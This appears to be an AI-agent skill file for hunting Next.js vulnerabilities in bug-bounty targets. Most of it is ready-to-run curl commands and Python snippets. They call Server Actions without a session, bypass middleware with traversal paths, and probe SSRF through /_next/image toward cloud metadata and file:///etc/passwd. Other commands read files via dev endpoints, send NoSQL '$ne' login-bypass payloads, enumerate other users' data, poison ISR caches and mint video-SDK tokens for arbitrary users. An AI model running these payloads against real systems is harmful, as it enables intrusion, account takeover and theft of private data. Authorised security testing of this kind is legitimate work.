---
name: hunt-nextjs
description: Hunt Next.js specific vulnerabilities — Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 13/14/15 or any React SSR framework.
sources: "cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g), Next.js advisories"
report_count: 0
---

# HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities

## Crown Jewel Targets

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Highest-value chains:**
- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
- **Middleware bypass via `/_next/static/`** — middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
- **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client

---

## Attack Surface Signals

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
```

---

## Phase 1 — Fingerprint & Version Detection

### Route structure via response headers (fastest signal)

Vercel/Next.js responses include `x-matched-path` and `x-nextjs-rewritten-path`
headers that reveal the internal route pattern. These are more useful than JS
bundle analysis for mapping the server-side route structure:

```bash
# Probe several paths and extract the route-matching headers
for path in / /api /api/health /sse /mcp /api/foo /callback; do
  echo "=== $path ==="
  curl -sI "https://$TARGET$path" | grep -iE "x-matched-path|x-nextjs-rewritten"
done
```

Example output (Neon MCP server):
```
/sse → x-matched-path: /api/[transport], x-nextjs-rewritten-path: /api/sse
/mcp → x-matched-path: /api/[transport], x-nextjs-rewritten-path: /api/mcp
/api/health → x-matched-path: /api/health
/callback → x-matched-path: /callback
```

This instantly reveals:
- Which paths are explicit routes vs catch-all `[param]` routes
- What rewrite rules are in play (e.g., `/sse` → `/api/sse`)
- The entire API surface structure without needing source code

```bash
# Confirm Next.js and get build ID
curl -s https://$TARGET/ | grep -oP '"buildId":"[^"]+"'
curl -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '"next":"[^"]+"'

# Source map exposure
curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

---

## Phase 2 — Server Actions Abuse

```bash
# Server Actions in Next.js 14+ use x-action-id or Next-Action header
# Find action IDs in HTML source or JS bundles
curl -s https://$TARGET/ | grep -oP '"action":"[a-f0-9]+"'
grep -r "createActionURL\|$$ACTION_" recon/$TARGET/ --include="*.js" 2>/dev/null

# Call Server Action directly without auth
curl -s -X POST https://$TARGET/target-page \
  -H "Next-Action: ACTION_ID_HERE" \
  -H "Content-Type: multipart/form-data; boundary=----" \
  -H "Cookie: " \
  --data-raw $'------\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------\r\n'

# Test: does the action execute without a valid session?
# If it returns data or mutates state → auth enforcement is client-side only
```

---

## Phase 3 — Middleware Auth Bypass

```bash
# Next.js middleware runs on edge runtime and may skip certain paths
# Test protected route directly
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
# → 200 means accessible

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

---

## Phase 4 — Image Optimization SSRF (`/_next/image`)

```bash
# Basic SSRF test — internal metadata
curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"

# Protocol bypass attempts
curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"

# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
COLLAB="http://UNIQUE.COLLAB_HOST"
curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
# Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
```

**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
fetches URLs allowed by `images.remotePatterns` / `images.domains` in
`next.config.js`. A non-whitelisted `url` returns **400 by default** — that is
the optimizer's normal allowlist rejection, NOT a "block" you bypassed. A **200**
returns an *optimized image*, not the upstream response body, so a status code
alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique
Collaborator subdomain** (above), or by body-diffing a known-internal vs
known-external target. Do not report on status code.

> Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
> NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
> Actions surface.

---

## Phase 5 — `/_next/data/` IDOR & Data Leakage

```bash
# Enumerate prerendered JSON for user-specific data
# Pattern: /_next/data/BUILD_ID/[page].json or /_next/data/BUILD_ID/[dynamic]/[id].json
curl -s "https://$TARGET/_next/data/$BUILD_ID/profile.json" \
  -H "Cookie: session=VICTIM_SESSION"

# Try other users' data
for ID in 1 2 3 100 1000; do
  curl -s "https://$TARGET/_next/data/$BUILD_ID/users/$ID.json" | head -3
done

# Check __NEXT_DATA__ in HTML for sensitive server-side props
curl -s "https://$TARGET/dashboard" | \
  python3 -c "import sys,re,json; m=re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')"
```

### Build manifest route enumeration and SSR-data false-positive guard

For modern Pages Router apps, `/_next/static/$BUILD_ID/_buildManifest.js` is often the fastest way to enumerate the full client route map, including admin-only pages and dynamic route patterns, even when the UI has no navigation exposed yet.

```bash
BUILD_ID=$(curl -sk https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
curl -sk "https://$TARGET/_next/static/$BUILD_ID/_buildManifest.js" -o buildmanifest.js
python3 - <<'PY'
import re
m=open('buildmanifest.js',errors='ignore').read()
for r in sorted(set(re.findall(r'"(/[^"{}]+)":\[', m))):
    print(r)
PY
```

If unauthenticated `/admin`, `/user-management`, `/submission`, etc. return `200`, do **not** immediately call it auth bypass. First inspect `__NEXT_DATA__` / React Query dehydration. A 200 shell with `dehydratedState.queries=[]` and `mutations=[]` is usually an attack-surface exposure, not data access. A real finding requires populated SSR data, protected API responses, or actionable privileged operations.

```bash
curl -sk "https://$TARGET/user-management" -o /tmp/page.html
python3 - <<'PY'
import re,json
h=open('/tmp/page.html',errors='ignore').read()
m=re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>',h,re.S)
d=json.loads(m.group(1)) if m else {}
pp=d.get('props',{}).get('pageProps',{})
dh=pp.get('dehydratedState',{})
print('queries=', len(dh.get('queries',[])), 'mutations=', len(dh.get('mutations',[])))
for q in dh.get('queries',[])[:5]:
    print(q.get('queryKey'), str(q.get('state',{}).get('data',''))[:300])
PY
```

**Severity discipline:**
- `200` admin shell + empty dehydrated data = Low/Info route exposure / recon lead.
- `200` admin shell + embedded user/submission/customer data = High data leak.
- `/_next/data/...json` exposing protected records without auth = High/Critical depending on data.

### API prefix discovery via backend-error differential

Next.js apps often proxy `/api/:path*` to a backend whose real route prefix is versioned (`/v1`, `/v2`). Probe prefix variants and watch for a transition from a generic proxy/backend `400 Bad request` to structured framework errors (`401 JWT token not found`, FastAPI/Gin/Pydantic `422` validation). That differential identifies the real API prefix and framework.

```bash
for prefix in "" "/v1" "/v2"; do
  for ep in /auth/login /auth/login/sso/info /user/me /user/list; do
    p="/api${prefix}${ep}"
    code=$(curl -sk -o /tmp/r -w "%{http_code}" "https://$TARGET$p" -H 'Accept: application/json')
    printf '%-40s -> %s %s\n' "$p" "$code" "$(head -c 180 /tmp/r)"
  done
 done
```

Example signal:
```
/api/user/me       -> 400 {"message":"Bad request"}        # wrong prefix
/api/v1/user/me    -> 401 {"detail":"Authentication required"}  # real API prefix
/api/v1/auth/login -> 422 {"loc":["body","username"]...}       # schema inferred
```

Also grep API responses for Envoy/Istio leakage to map K8s services used by rewrites:

```bash
curl -skI "https://$TARGET/api/v1/user/me" | grep -iE 'x-envoy|x-upstream|x-service'
# e.g. x-envoy-decorator-operation: api-service.ekyb.svc.cluster.local:80/*
```

### Next.js API Route NoSQL Injection (JSON body → MongoDB)

Next.js API routes (`/api/*`) parse JSON bodies automatically when
`Content-Type: application/json` is set — `req.body` is already an object.
If the route passes `req.body` fields directly into a MongoDB/Mongoose query
without type validation or sanitization, it is vulnerable to NoSQL operator
injection. This is the **same class** as classic Express+MongoDB NoSQLi, but
the Next.js-specific angle is that the framework's built-in JSON parsing makes
the attack trivially easy — no `body-parser` config to misconfigure, the body
is parsed by default.

**Type-confusion detection signal (500 ISE differential):**

Send non-string types (boolean, integer, array, object) where the endpoint
expects a string. If the backend passes the raw value to the database without
validation, the query crashes → **500 Internal Server Error**. A normal
request (string values) returns 400/401, but type-confused values return 500.
This differential proves the backend is coupling user input directly to the
database — a strong signal that operator injection (`$ne`, `$gt`, `$regex`)
will also work.

```bash
# Step 1: Baseline — normal request returns 401/400
curl -s -o /dev/null -w "%{http_code}" -X POST "https://$TARGET/api/admin/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}'
# → 401 or 400

# Step 2: Type-confusion probe — non-string types
curl -s -o /dev/null -w "%{http_code}" -X POST "https://$TARGET/api/admin/login" \
  -H "Content-Type: application/json" \
  -d '{"username":true,"password":true}'
# → 500 ISE = backend passes raw value to DB without type check

curl -s -o /dev/null -w "%{http_code}" -X POST "https://$TARGET/api/admin/login" \
  -H "Content-Type: application/json" \
  -d '{"username":1,"password":1}'
# → 500 ISE = same signal

# Step 3: If 500 ISE on type confusion, try operator injection
curl -s -X POST "https://$TARGET/api/admin/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
# → If this returns 200 with a session token = auth bypass confirmed
# → If this returns 500 ISE = operators reach the DB but crash (may still be
#   exploitable with different operators — try $gt, $regex, $in)
# → If this returns 401/400 = operators are filtered (not vulnerable)
```

**Pitfall:** Cloudflare and other CDNs strip 500 error bodies — you'll get
a bare "Internal Server Error" string with no stack trace. The **status code
differential** (401 for strings vs 500 for objects) is the signal, not the
error message. Don't dismiss a 500 as "just a server error" — on a
well-functioning API, sending `{"username":true}` should return 400
("invalid input"), not 500. A 500 means the server tried to use the value
and crashed.

**Pitfall:** `$where`-based timing attacks may not produce measurable delays
when the app is behind Cloudflare — the CDN's own latency (100-200ms per
request) can mask sub-second DB delays. Use longer sleep values (5-10s) and
take multiple measurements. If timing is inconclusive, fall back to
response-based oracle (does `{"$ne":""}` return a different response than
`{"$ne":"x"}`?).

**Pitfall (the Bcrypt Wall):** 500 ISE on type confusion does NOT always
mean operators reach MongoDB. The most common Node.js auth pattern does
`findOne({username})` then `bcrypt.compare(password, user.hash)`. An
object password crashes in `bcrypt.compare()` (bcrypt calls `.charAt()`
on the object → TypeError → 500), NOT in MongoDB. An object username
crashes in `username.trim()` before any DB query. To distinguish:
send `{"username":"admin","password":{"$regex":"^zzz_impossible"}}` — if
500 (should be no match if $regex were evaluated) → operators NOT reaching
DB, crash is in bcrypt. If 401 → $regex WAS evaluated, blind NoSQLi
possible. See the `hunt-nosqli` skill's Phase 0.5 for the full diagnostic
decision tree.

**Validation ladder:**
1. Type confusion → 500 ISE (confirms DB coupling)
2. Operator injection → different response than baseline (confirms operator
   reaches DB)
3. `$ne`/`$gt` on password field → 200 with session token (confirms auth
   bypass)
4. `$regex` on username → response length differential (confirms blind
   extraction possible)

See `references/nosqli-via-nextjs-api-routes.md` for a real-world case study.

### Runtime config files and cross-app trust maps

Check for root-level runtime configuration loaded by App Router/Next runtime scripts. These files often disclose backend hosts, Socket.IO paths/namespaces, public tokens, and embed parent-origin allowlists.

```bash
curl -sk "https://$TARGET/runtime-config.js"
curl -sk "https://$TARGET/" | grep -oE 'runtime-config\.js|__.*RUNTIME_CONFIG__|NEXT_PUBLIC_[A-Z0-9_]+'
```

Example:
```js
window.__CHAT_RUNTIME_CONFIG__ = {
  "NEXT_PUBLIC_CHAT_SERVER_URL": "",
  "NEXT_PUBLIC_CHAT_SOCKET_PATH": "",
  "NEXT_PUBLIC_CHAT_NAMESPACE": "",
  "NEXT_PUBLIC_CHAT_EMBED_PARENT_ORIGINS": "https://ekyb.stg.inexus.ai"
};
```

Treat runtime config as an attack-surface map, not automatically a secret: follow `js-analysis-anti-false-positive`; report only if it reveals a sensitive boundary or enables a chain.

---

## Phase 6 — ISR Cache Poisoning

```bash
# ISR pages regenerate on request after revalidation period
# If user input influences the static page content without sanitization:
# 1. Trigger revalidation with malicious input in URL/query
# 2. Injected content cached and served to all users

# Test: does query param affect cached page content?
# Use a UNIQUE marker (not a generic <script>) so a match proves YOUR input landed,
# and confirm the response was actually CACHED + served to a DIFFERENT client.
MARK="zqx$(date +%s)"
# 1) Poison with the marker
curl -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null
# 2) Re-fetch the CLEAN url (no query) from a fresh client and grep the marker.
#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected
#    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"

# On-demand revalidation endpoint (if exposed)
curl -s "https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test"
curl -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
```

---

## Phase 7 — Debug & Stack Frame Endpoints

**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
are react-dev-overlay middleware mounted ONLY under `next dev`. A production
build (`next build && next start`) does not register these routes — a 404 here
is the normal, expected result, not a "filter" you need to bypass. They are
reachable ONLY in the rare misconfiguration of literally running `next dev` in
production. Treat any non-404 as the real finding; do NOT report a 404/filtered
response as confirmation.

```bash
# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
curl -s -o /dev/null -w "%{http_code}" \
  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"

# Only if the above is NOT 404: the launch-editor / stack-frame endpoints can
# reference local files (file-read surface of a dev server wrongly exposed)
curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
curl -s "https://$TARGET/__nextjs_original-stack-frame" \
  --data '{"file":"/etc/passwd","line":1,"column":1}'
```

---

## Phase 8 — Environment Variable Leakage

```bash
# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
curl -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
  grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"

# Check for non-public vars accidentally exposed
curl -s https://$TARGET/ | python3 -c "
import sys, re, json
m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"
```

---

## Phase 9 — Third-Party Video SDK JWT Exploitation

Next.js apps using real-time video SDKs (Stream.io, Twilio, Daily.co,
LiveKit, Agora) generate provider-signed JWTs via server-side API routes
or Server Components. The vulnerability: the token endpoint accepts a
`userId` query parameter and returns a valid JWT for ANY userId **without
checking authorisation** — no session, no appointment, no auth.

### Detection

```bash
# Find video SDK + API key in JS bundles
grep -rohP 'stream-io|getstream|twilio-video|daily.co|livekit|agora' recon/$TARGET/ --include="*.js"
grep -rohP 'apiKey:["\x27][^"\x27]+' recon/$TARGET/ --include="*.js"
# Find token-generation endpoints
grep -rohP 'create-token|getToken|/api/token|/api/video/token' recon/$TARGET/ --include="*.js"
# Test: does /create-token?userId=1 return a JWT?
curl -s "https://$TARGET/create-token?userId=1" | grep -oP '<div id="token">[^<]+</div>'
```

### Exploitation

Once a token endpoint is found, generate JWTs for arbitrary userIds,
extract the hardcoded API key from client JS, and call the provider's
Video API directly. See `references/video-sdk-jwt-exploit.md` for the
full Stream.io endpoint map, exploitation recipe, and generalisation to
other SDKs. See `scripts/video-sdk-jwt-exploit.py` for a reusable PoC
template.

### CRITICAL — "401 Suspended" = Auth Passed

When testing the provider API, a `401` response containing "Suspended"
or an internal API method name (`QueryCalls`, `GetCall`, etc.) means
**authentication PASSED** — the request reached business logic and was
rejected for account status, NOT invalid credentials. Do NOT dismiss
this as "auth rejected." A real rejection would say "Unauthorized" or
"Invalid token" without naming the internal method. See the reference
file for the full interpretation rule.

### Severity

- Telemedicine/healthcare: **Critical** (CVSS 9.1) — HIPAA/privacy violation
- Financial advisory: High — insider information
- Customer support: High — PII exposure
- General video calls: Medium-High

## Chain Table

| Next.js finding | Chain to | Impact |
|----------------|----------|--------|
| Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
| `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
| `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
| Middleware bypass | Protected admin routes | Auth bypass |
| Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
| `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |
| API route NoSQLi (type confusion → operators) | Auth bypass / data dump | Critical / High |
| Video SDK token endpoint no auth | Join any user's video call, record, DoS | Critical (telemedicine) |

---

## Validation

✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
✅ Middleware bypass: 200 response on protected route without auth cookie
✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII
✅ API NoSQLi: type confusion → 500 ISE + operator injection → 200 with session token

**Severity:**
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium
